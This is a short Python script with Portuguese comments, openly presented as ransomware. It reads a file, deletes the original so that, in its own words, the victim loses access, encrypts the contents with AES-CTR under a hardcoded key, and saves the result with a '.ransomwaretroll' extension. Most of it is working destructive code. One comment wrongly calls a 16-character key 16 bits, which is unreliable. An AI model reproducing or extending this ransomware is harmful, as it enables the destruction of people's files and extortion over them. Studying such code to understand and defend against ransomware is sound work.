import os ## Bibiloteca que nos permite acessar comandos do Sistema Operacional
import pyaes ## Biblioteca responsável por fazer a criptografia dos dados

## abrir o arquivo a ser criptografado
file_name = "teste.txt" ## Colocamos entre "" o nome do arquivo que desejamos criptografar
file = open(file_name, "rb") ## Vamos abrir esse arquivo com o comando "open" e insinuar que vamos lê-lo, utilizando o "rb" 
file_data = file.read() # Vamos ler todo o conteúdo do arquivo e salvá-lo na variável correspondente
file.close() ## Vamos fechar esse arquivo

## remover o arquivo
os.remove(file_name) ## Vamos remover o arquivo do sistema, para que a vítima não tenha mais o acesso

## chave de criptografia
key = b"testeransomwares" ## Vamos definir a nossa chave de criptografia, levando em consideração que ela deve ter 16 caracteres, ou seja, 16 bits
aes = pyaes.AESModeOfOperationCTR(key) ## Vamos iniciar a função de criptografia com base na chave que nos difinimos anteriormente

## criptografar o arquivo
crypto_data = aes.encrypt(file_data) ## Iniciamos a criptografia para o arquivo que desejamos

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll" ## Vamos salvar um novo arquivo, que por sua vez vai receber um novo nome
new_file = open(f'{new_file}','wb') ## Vamos abrir esse aquivo com o comando "open", e insinuar que vamos escrever algo nele, utilizando o "wb"
new_file.write(crypto_data) ## Vamos escrever os dados criptografados nesse novo arquivo, utilizando o comando "write"
new_file.close() ## Vamos fechar esse novo arquivo
